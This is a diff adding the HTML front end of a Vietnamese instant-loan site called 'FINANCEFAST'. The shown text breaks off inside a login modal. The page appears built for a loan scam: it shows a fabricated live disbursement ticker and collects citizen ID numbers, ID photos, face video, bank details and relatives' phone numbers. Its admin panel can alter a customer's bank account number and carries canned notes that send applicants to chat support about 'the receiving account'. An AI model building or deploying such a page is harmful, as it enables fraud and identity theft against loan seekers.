@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FINANCEFAST - Hỗ Trợ Tài Chính Tiêu Dùng Nhanh Chóng</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; font-size: 15px; -webkit-tap-highlight-color: transparent; }
+        .slider-thumb::-webkit-slider-thumb {
+            appearance: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #F59E0B;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.4);
+            border: 4px solid #ffffff;
+        }
+        .ekyc-circle-cam {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #F59E0B;
+            box-shadow: 0 0 20px rgba(245, 158, 11, 0.5);
+            margin: 0 auto;
+            position: relative;
+            transform: scaleX(-1);
+        }
+    </style>
+</head>
+<body class="bg-white text-slate-900 min-h-screen flex flex-col justify-between selection:bg-amber-300 selection:text-slate-900 pb-20">
+
+    <!-- HEADER -->
+    <header class="w-full bg-white border-b border-slate-100 sticky top-0 z-50 px-4 py-3.5">
+        <div class="max-w-md mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2.5 cursor-pointer" onclick="switchTab('home')">
+                <div class="w-11 h-11 rounded-2xl bg-amber-500 flex items-center justify-center font-black text-white text-2xl shadow-md shadow-amber-500/20">🐻</div>
+                <div>
+                    <span class="font-black text-base tracking-tight text-slate-900 block leading-tight">FINANCE</span>
+                    <span class="font-black text-sm tracking-tight text-amber-500 block leading-none">FAST</span>
+                </div>
+            </div>
+            
+            <div class="flex items-center space-x-2">
+                <button id="userAccountBtn" onclick="handleHeaderAccountClick()" class="text-xs md:text-sm font-extrabold text-slate-900 bg-amber-400 hover:bg-amber-500 px-4 py-2.5 rounded-xl shadow-sm transition">Đăng Nhập</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- NỘI DUNG CHÍNH -->
+    <main class="flex-1 flex items-center justify-center p-4">
+        <div class="max-w-md w-full bg-white rounded-3xl p-5 md:p-6 relative overflow-hidden space-y-6">
+            
+            <!-- 1. TRANG CHỦ -->
+            <div id="stepHome" class="space-y-4">
+                <div class="space-y-1.5 text-center md:text-left">
+                    <h1 class="text-2xl md:text-3xl font-black text-slate-900 tracking-tight leading-tight">Chạm nhẹ một cái,<br>tiền về liền tay!</h1>
+                    <p class="text-xs md:text-sm text-slate-500 font-bold">Lựa chọn hạn mức lên đến 100.000.000 ₫</p>
+                </div>
+
+                <!-- BẢNG THÔNG BÁO GIẢI NGÂN REAL-TIME -->
+                <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 flex items-center space-x-3 shadow-sm">
+                    <div class="bg-amber-400 text-slate-900 rounded-full p-2 animate-pulse shrink-0 font-bold">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <div class="overflow-hidden">
+                        <p class="text-[11px] text-amber-800 font-black uppercase tracking-wider">Hệ thống vừa giải ngân:</p>
+                        <div id="liveTicker" class="text-xs md:text-sm font-black text-emerald-700 transition-opacity duration-300 truncate">
+                            Khách hàng 098****382 vừa duyệt vay 50.000.000 ₫
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Chọn số tiền vay -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-2.5">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs md:text-sm font-bold text-slate-600">Số tiền vay:</span>
+                        <span id="amountDisplay" class="text-xl md:text-2xl font-black text-slate-900">20.000.000 ₫</span>
+                    </div>
+                    <input type="range" id="loanRange" min="500000" max="100000000" step="500000" value="20000000" 
+                           oninput="calculateLoan()" 
+                           class="w-full h-3 bg-slate-200 rounded-lg appearance-none cursor-pointer slider-thumb accent-amber-400">
+                    <div class="flex justify-between text-xs font-bold text-slate-400">
+                        <span>500.000 ₫</span>
+                        <span>100.000.000 ₫</span>
+                    </div>
+                </div>
+
+                <!-- Chọn số tháng vay -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-2">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs md:text-sm font-bold text-slate-600">Kỳ hạn trả góp:</span>
+                        <select id="loanTerm" onchange="calculateLoan()" class="bg-white border border-slate-200 rounded-xl px-3.5 py-2 text-xs md:text-sm font-black text-amber-600 outline-none">
+                            <option value="3">3 Tháng</option>
+                            <option value="6" selected>6 Tháng</option>
+                            <option value="12">12 Tháng</option>
+                            <option value="24">24 Tháng</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Bảng chi tiết tính lãi suất -->
+                <div class="bg-amber-50/75 border border-amber-200 rounded-2xl p-4 space-y-2.5 text-xs md:text-sm">
+                    <div class="flex justify-between"><span class="text-slate-600 font-semibold">Lãi suất ưu đãi:</span><span class="font-bold text-emerald-600">1.2% / tháng</span></div>
+                    <div class="flex justify-between"><span class="text-slate-600 font-semibold">Đóng hàng tháng:</span><span id="monthlyPayment" class="font-black text-amber-700 text-sm">0 ₫</span></div>
+                    <div class="flex justify-between border-t border-amber-200 pt-2"><span class="text-slate-700 font-bold">Tổng tiền phải trả:</span><span id="totalPayment" class="font-black text-slate-900 text-sm">0 ₫</span></div>
+                </div>
+
+                <button onclick="startLoanProcess()" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-base shadow-xl shadow-amber-400/25 transition active:scale-[0.98]">
+                    Vay Ngay!
+                </button>
+            </div>
+
+            <!-- TAB 2: THÔNG TIN VAY -->
+            <div id="tabLoanInfo" class="space-y-4 hidden py-2">
+                <div class="space-y-1">
+                    <h2 class="text-xl font-black text-slate-900">Thông Tin Gói Vay</h2>
+                    <p class="text-xs md:text-sm text-slate-500 font-semibold">Chính sách tài chính minh bạch</p>
+                </div>
+                <div class="space-y-3 text-xs md:text-sm">
+                    <div class="bg-amber-50 border border-amber-200 p-4 rounded-2xl space-y-1.5">
+                        <span class="font-bold text-amber-800 text-sm block">💡 Ưu đãi gói vay tiêu dùng</span>
+                        <p class="text-amber-900 leading-relaxed font-medium">Lãi suất cố định 1.2%/tháng, hỗ trợ trả góp linh hoạt từ 3 đến 24 tháng, xét duyệt tự động và giải ngân nhanh chóng trong 15 phút!</p>
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 p-4 rounded-2xl space-y-2">
+                        <span class="font-bold text-slate-800 text-sm block">⚡ Điều kiện đơn giản</span>
+                        <p class="text-slate-600 font-medium">Chỉ cần CCCD chính chủ, không giữ giấy tờ, hỗ trợ toàn quốc.</p>
+                    </div>
+                </div>
+                <button onclick="switchTab('home')" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition">
+                    Đăng Ký Vay Ngay
+                </button>
+            </div>
+
+            <!-- TAB 3: HỒ SƠ VAY CỦA KHÁCH -->
+            <div id="tabApplications" class="space-y-4 hidden py-2">
+                <div class="space-y-1">
+                    <h2 class="text-xl font-black text-slate-900">Hồ Sơ Của Tôi</h2>
+                    <p class="text-xs md:text-sm text-slate-500 font-semibold">Quản lý tiến độ và chi tiết khoản vay</p>
+                </div>
+                <div id="appStatusContainer" class="space-y-3">
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-center space-y-3">
+                        <div class="text-4xl">📂</div>
+                        <p class="text-xs md:text-sm text-slate-500 font-bold">Bạn chưa có hồ sơ vay nào được gửi đi.</p>
+                        <button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-5 py-2.5 rounded-xl text-xs md:text-sm font-bold shadow-sm">Tạo Hồ Sơ Vay</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 4: CÁ NHÂN -->
+            <div id="tabProfile" class="space-y-4 hidden py-2">
+                <div class="bg-gradient-to-r from-amber-500 to-amber-600 rounded-3xl p-5 text-white shadow-lg space-y-3">
+                    <div class="flex items-center space-x-3">
+                        <div id="profileAvatar" class="w-14 h-14 bg-white text-amber-600 rounded-2xl flex items-center justify-center text-2xl font-black shadow">A</div>
+                        <div>
+                            <h3 id="profileFullName" class="text-base font-black">Khách hàng</h3>
+                            <p id="profileUserPhone" class="text-xs text-amber-100 font-semibold">SĐT: --</p>
+                        </div>
+                    </div>
+                    <div class="bg-white/15 backdrop-blur-md rounded-2xl p-3 flex justify-between items-center text-xs">
+                        <div>
+                            <span class="text-amber-100 block text-[10px] uppercase font-bold">Hạn mức khả dụng</span>
+                            <span class="font-black text-sm">100.000.000 ₫</span>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-emerald-300 block text-[10px] uppercase font-bold">Trạng thái định danh</span>
+                            <span class="font-black text-xs bg-emerald-500/30 px-2 py-0.5 rounded-full">✅ Đã xác thực eKYC</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-2 text-xs">
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>🛡️ Trung tâm bảo mật & Mật khẩu</span>
+                        <span class="text-amber-600">Đã bảo mật</span>
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>💳 Tài khoản ngân hàng liên kết</span>
+                        <span class="text-emerald-600">Đã liên kết</span>
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>📞 Tổng đài chăm sóc khách hàng</span>
+                        <span class="text-amber-600">1900 6868</span>
+                    </div>
+                </div>
+
+                <div class="pt-2">
+                    <button onclick="userLogout()" class="w-full bg-red-50 text-red-600 hover:bg-red-100 py-3.5 rounded-2xl font-extrabold text-xs md:text-sm transition shadow-sm">Đăng Xuất Tài Khoản</button>
+                </div>
+            </div>
+
+            <!-- TIẾN TRÌNH CÁC BƯỚC VAY -->
+            <div id="progressContainer" class="hidden mb-4 space-y-2">
+                <div class="flex justify-between items-center text-xs md:text-sm">
+                    <span id="stepTitle" class="font-extrabold text-amber-600">Bước 1/4: Thông tin cá nhân</span>
+                    <span id="stepPercent" class="text-slate-400 font-bold">25%</span>
+                </div>
+                <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden p-0.5 border border-slate-200">
+                    <div id="progressBar" class="bg-amber-400 h-full rounded-full transition-all duration-300" style="width: 25%;"></div>
+                </div>
+            </div>
+
+            <!-- TRANG 1: THÔNG TIN CÁ NHÂN -->
+            <div id="step1" class="space-y-3.5 hidden max-h-[460px] overflow-y-auto pr-1">
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Họ và tên đầy đủ (trên CCCD)</label>
+                    <input type="text" id="pName" placeholder="NGUYỄN VĂN A" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm uppercase focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Ngày tháng năm sinh</label>
+                    <input type="text" id="pDob" placeholder="DD/MM/YYYY (Ví dụ: 24/08/2002)" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Địa chỉ thường trú</label>
+                    <input type="text" id="pAddress" placeholder="Số nhà, Xã/Phường, Huyện/Quận, Tỉnh/TP" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Số Căn cước công dân (CCCD)</label>
+                    <input type="text" id="pCccd" placeholder="Nhập 12 chữ số CCCD" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Mục đích vay vốn</label>
+                    <select id="pPurpose" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-xs md:text-sm font-bold text-slate-800 outline-none">
+                        <option value="Tiêu dùng cá nhân">Tiêu dùng cá nhân</option>
+                        <option value="Kinh doanh nhỏ lẻ">Kinh doanh nhỏ lẻ</option>
+                        <option value="Mua sắm thiết bị / Xe cộ">Mua sắm thiết bị / Xe cộ</option>
+                        <option value="Thanh toán chi phí y tế / Sửa nhà">Thanh toán chi phí y tế / Sửa nhà</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Nơi làm việc / Tên công ty</label>
+                    <input type="text" id="pCompany" placeholder="Ví dụ: Công ty TNHH ABC" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Số điện thoại công ty / Đồng nghiệp</label>
+                    <input type="tel" id="pCompPhone" placeholder="Số điện thoại liên lạc công ty" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Thu nhập hàng tháng</label>
+                    <select id="pIncome" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-xs md:text-sm font-bold text-slate-800 outline-none">
+                        <option value="Dưới 5 triệu ₫">Dưới 5 triệu ₫</option>
+                        <option value="Từ 5 - 10 triệu ₫">Từ 5 - 10 triệu ₫</option>
+                        <option value="Từ 10 - 20 triệu ₫">Từ 10 - 20 triệu ₫</option>
+                        <option value="Trên 20 triệu ₫">Trên 20 triệu ₫</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Ngày đóng lãi hàng tháng</label>
+                    <select id="pPayDay" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-xs md:text-sm font-bold text-slate-800 outline-none">
+                        <option value="Ngày 05 hằng tháng">Ngày 05 hằng tháng</option>
+                        <option value="Ngày 10 hằng tháng">Ngày 10 hằng tháng</option>
+                        <option value="Ngày 15 hằng tháng">Ngày 15 hằng tháng</option>
+                        <option value="Ngày 20 hằng tháng">Ngày 20 hằng tháng</option>
+                        <option value="Ngày 25 hằng tháng">Ngày 25 hằng tháng</option>
+                    </select>
+                </div>
+                <button onclick="nextStep(1)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục</button>
+            </div>
+
+            <!-- TRANG 2: NGƯỜI THÂN THẨM ĐỊNH -->
+            <div id="step2" class="space-y-4 hidden">
+                <div class="space-y-3">
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Họ tên người thân tham chiếu</label>
+                        <input type="text" id="rName1" placeholder="Ví dụ: NGUYỄN THỊ B" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm uppercase focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Số điện thoại người thân</label>
+                        <input type="tel" id="rPhone1" placeholder="Số điện thoại liên lạc người thân" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Mối quan hệ</label>
+                        <input type="text" id="rRelation" placeholder="Ví dụ: Vợ chồng, Bố mẹ, Anh chị em" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                </div>
+                <button onclick="nextStep(2)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục</button>
+            </div>
+
+            <!-- TRANG 3: TÀI KHOẢN NGÂN HÀNG -->
+            <div id="step3" class="space-y-4 hidden">
+                <div class="space-y-3">
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Tên Ngân Hàng nhận tiền</label>
+                        <input type="text" id="bankName" placeholder="Ví dụ: MB Bank, Techcombank, VPBank" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Số Tài Khoản (STK)</label>
+                        <input type="text" id="bankAccount" placeholder="Nhập chính xác số tài khoản ngân hàng" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                    <div>
+                        <label class="block text-xs md:text-sm font-bold text-slate-700 mb-1">Tên Chủ Tài Khoản</label>
+                        <input type="text" id="bankOwner" placeholder="VIẾT HOA KHÔNG DẤU GIỐNG THẺ" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm uppercase focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                    </div>
+                </div>
+                <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
+            </div>
+
+            <!-- TRANG 4: eKYC -->
+            <div id="step4" class="space-y-4 hidden">
+                <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs md:text-sm text-amber-900 space-y-1">
+                    <p class="font-black">📌 Xác thực eKYC ngân hàng:</p>
+                    <p class="text-xs text-amber-800">1. CCCD: Chọn tải ảnh hoặc chụp trực tiếp.</p>
+                    <p class="text-xs text-amber-800">2. Video khuôn mặt: Vòng tròn tự động quay theo hướng dẫn.</p>
+                </div>
+
+                <!-- CCCD Mặt Trước -->
+                <div class="space-y-1">
+                    <label class="block text-xs font-bold text-slate-700">Mặt Trước CCCD</label>
+                    <div class="grid grid-cols-2 gap-2">
+                        <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
+                            📁 Tải ảnh có sẵn
+                            <input type="file" accept="image/*" onchange="previewSelectedImage(this, 'previewFront')" class="hidden">
+                        </label>
+                        <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
+                            📷 Chụp trực tiếp
+                            <input type="file" accept="image/*" capture="environment" onchange="previewSelectedImage(this, 'previewFront')" class="hidden">
+                        </label>
+                    </div>
+                    <div id="previewFront" class="mt-2 text-center"></div>
+                </div>
+
+                <!-- CCCD Mặt Sau -->
+                <div class="space-y-1">
+                    <label class="block text-xs font-bold text-slate-700">Mặt Sau CCCD</label>
+                    <div class="grid grid-cols-2 gap-2">
+                        <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
+                            📁 Tải ảnh có sẵn
+                            <input type="file" accept="image/*" onchange="previewSelectedImage(this, 'previewBack')" class="hidden">
+                        </label>
+                        <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
+                            📷 Chụp trực tiếp
+                            <input type="file" accept="image/*" capture="environment" onchange="previewSelectedImage(this, 'previewBack')" class="hidden">
+                        </label>
+                    </div>
+                    <div id="previewBack" class="mt-2 text-center"></div>
+                </div>
+
+                <!-- QUAY VIDEO eKYC VÒNG TRÒN -->
+                <div class="border border-slate-200 p-4 rounded-2xl bg-slate-50 text-center space-y-3">
+                    <label class="block text-xs font-bold text-slate-700">Xác thực khuôn mặt (eKYC Video)</label>
+                    
+                    <div class="ekyc-circle-cam bg-black shadow-inner">
+                        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover"></video>
+                    </div>
+
+                    <div id="ekycInstruction" class="text-xs font-black text-amber-600 bg-amber-50 py-1.5 px-3 rounded-full inline-block border border-amber-200">
+                        Nhấn nút bên dưới để bắt đầu xác thực
+                    </div>
+
+                    <div class="pt-1">
+                        <button type="button" onclick="startAutoEkyc()" id="ekycBtn" class="bg-amber-500 hover:bg-amber-600 text-white px-6 py-2.5 rounded-xl text-xs font-extrabold transition shadow">Bắt Đầu Quay Tự Động</button>
+                    </div>
+                </div>
+
+                <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-4 rounded-2xl font-black text-sm shadow-lg shadow-emerald-500/25 transition">Gửi Hồ Sơ Xét Duyệt</button>
+            </div>
+
+            <!-- BẢNG QUẢN TRỊ ADMIN -->
+            <div id="adminPanel" class="space-y-4 hidden py-2">
+                <div class="flex justify-between items-center border-b border-slate-100 pb-3">
+                    <div>
+                        <h2 class="text-lg font-black text-slate-900">Quản Trị Đơn Vay</h2>
+                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ khách hàng</p>
+                    </div>
+                    <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
+                </div>
+
+                <!-- CÀI ĐẶT HỖ TRỢ ĐA KÊNH -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 space-y-2.5 text-xs md:text-sm">
+                    <span class="font-bold text-slate-800 block">⚙️ Cấu hình liên kết icon hỗ trợ nổi:</span>
+                    <div class="space-y-2">
+                        <input type="text" id="teleLinkInput" placeholder="Link Telegram (https://t.me/...)" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium">
+                        <input type="text" id="fbLinkInput" placeholder="Link Facebook (https://m.me/...)" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium">
+                        <input type="text" id="zaloLinkInput" placeholder="Link Zalo (https://zalo.me/...)" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium">
+                        <button onclick="saveSupportLinks()" class="w-full bg-slate-900 hover:bg-slate-800 text-white py-2.5 rounded-xl font-bold">Lưu Cấu Hình Hỗ Trợ</button>
+                    </div>
+                </div>
+
+                <!-- BẢNG CHỌN NHANH KHÁCH HÀNG -->
+                <div class="bg-blue-50 border border-blue-200 rounded-2xl p-3.5 space-y-2 text-xs">
+                    <span class="font-black text-blue-900 block">💡 Bấm chọn nhanh khách hàng để sao chép cú pháp:</span>
+                    <select id="quickClientSelect" onchange="selectQuickClient(this.value)" class="w-full p-2.5 bg-white border border-blue-200 rounded-xl font-bold text-blue-800 outline-none">
+                        <option value="">-- Bấm chọn khách hàng cần nhắn --</option>
+                    </select>
+                    <div id="quickClientSyntax" class="bg-white p-2 rounded-xl font-mono text-[11px] text-slate-700 border border-blue-100 hidden flex justify-between items-center">
+                        <span>Cú pháp: <b id="syntaxText" class="text-blue-600"></b></span>
+                        <button onclick="copySyntax()" class="bg-blue-600 text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">📋 Sao Chép</button>
+                    </div>
+                </div>
+
+                <!-- DANH SÁCH HỒ SƠ KHÁCH HÀNG -->
+                <div class="space-y-2">
+                    <span class="text-xs md:text-sm font-bold text-slate-700 uppercase tracking-wider block">📋 Hồ sơ khách đăng ký:</span>
+                    <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
+                        <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
+                            Chưa có hồ sơ khách đăng ký mới.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- KHUNG XEM VÀ SỬA CHI TIẾT ĐƠN VAY -->
+                <div id="adminDetailBox" class="bg-amber-50/80 border border-amber-200 rounded-2xl p-4 space-y-3 text-xs md:text-sm hidden">
+                    <div class="flex justify-between items-center">
+                        <span class="font-black text-amber-900 text-sm" id="detName">Chi tiết hồ sơ</span>
+                        <button onclick="closeAdminDetail()" class="text-slate-500 hover:text-slate-800 font-bold text-sm">✕ Đóng</button>
+                    </div>
+                    <div class="space-y-1 text-slate-700 text-xs" id="detInfo"></div>
+                    
+                    <div class="space-y-2.5 pt-1">
+                        <label class="block font-bold text-slate-700">Sửa số tài khoản (STK) khách hàng:</label>
+                        <input type="text" id="editStk" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-semibold text-xs">
+
+                        <label class="block font-bold text-slate-700">Chọn nhanh ghi chú đơn vay:</label>
+                        <div class="flex flex-wrap gap-1.5 pt-1">
+                            <button type="button" onclick="setQuickNote('THÔNG BÁO : LIÊN HỆ CSKH ĐỂ BIẾT THÊM VỀ THÔNG TIN STK NHẬN TIỀN')" class="bg-amber-100 hover:bg-amber-200 text-amber-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">💬 LH CSKH lấy STK nhận tiền</button>
+                            <button type="button" onclick="setQuickNote('Hồ sơ đã được phê duyệt thành công. Vui lòng liên hệ CSKH để nhận lệnh giải ngân.')" class="bg-emerald-100 hover:bg-emerald-200 text-emerald-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">✅ Duyệt & Nhận giải ngân</button>
+                            <button type="button" onclick="setQuickNote('Hồ sơ thiếu thông tin xác thực. Vui lòng cập nhật lại ảnh CCCD để tiếp tục xử lý.')" class="bg-red-100 hover:bg-red-200 text-red-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⚠️ Thiếu thông tin CCCD</button>
+                            <button type="button" onclick="setQuickNote('Khoản vay đang chờ xác nhận từ bộ phận kế toán giải ngân.')" class="bg-blue-100 hover:bg-blue-200 text-blue-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⏳ Chờ kế toán giải ngân</button>
+                        </div>
+                        <textarea id="editNote" placeholder="Hoặc tự nhập ghi chú tại đây..." class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium" rows="2"></textarea>
+                        
+                        <div class="grid grid-cols-2 gap-2 pt-2">
+                            <button onclick="updateLoanAction('Đã duyệt - Giải ngân')" class="bg-emerald-600 hover:bg-emerald-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">✅ Duyệt Đơn</button>
+                            <button onclick="updateLoanAction('Từ chối hồ sơ')" class="bg-red-600 hover:bg-red-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">❌ Từ Chối</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- NÚT HỖ TRỢ NỔI -->
+    <div class="fixed bottom-24 right-4 z-40 flex flex-col space-y-2">
+        <a id="floatingTele" href="https://t.me/" target="_blank" class="w-11 h-11 bg-sky-500 hover:bg-sky-600 text-white rounded-full flex items-center justify-center shadow-xl font-bold text-lg transition-transform hover:scale-105" title="Telegram">✈️</a>
+        <a id="floatingZalo" href="https://zalo.me/" target="_blank" class="w-11 h-11 bg-blue-600 hover:bg-blue-700 text-white rounded-full flex items-center justify-center shadow-xl font-bold text-xs transition-transform hover:scale-105" title="Zalo">Zalo</a>
+        <a id="floatingFb" href="https://m.me/" target="_blank" class="w-11 h-11 bg-blue-500 hover:bg-blue-600 text-white rounded-full flex items-center justify-center shadow-xl font-bold text-lg transition-transform hover:scale-105" title="Messenger">💬</a>
+    </div>
+
+    <!-- TAB MENU ĐÁY MÀN HÌNH -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 shadow-lg z-50 py-2.5 px-6">
+        <div class="max-w-md mx-auto flex justify-between items-center text-center">
+            <button onclick="switchTab('home')" class="flex flex-col items-center space-y-1 text-slate-600 hover:text-amber-500 transition">
+                <span class="text-2xl">🏠</span>
+                <span class="text-[11px] font-black">Trang chủ</span>
+            </button>
+            <button onclick="switchTab('loanInfo')" class="flex flex-col items-center space-y-1 text-slate-600 hover:text-amber-500 transition">
+                <span class="text-2xl">💳</span>
+                <span class="text-[11px] font-black">Thông tin vay</span>
+            </button>
+            <button onclick="switchTab('applications')" class="flex flex-col items-center space-y-1 text-slate-600 hover:text-amber-500 transition">
+                <span class="text-2xl">📂</span>
+                <span class="text-[11px] font-black">Hồ sơ vay</span>
+            </button>
+            <button onclick="switchTab('profile')" class="flex flex-col items-center space-y-1 text-slate-600 hover:text-amber-500 transition">
+                <span class="text-2xl">👤</span>
+                <span class="text-[11px] font-black">Cá nhân</span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ -->
+    <div id="authModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-3xl max-w-sm w-full p-6 relative space-y-4 shadow-2xl">
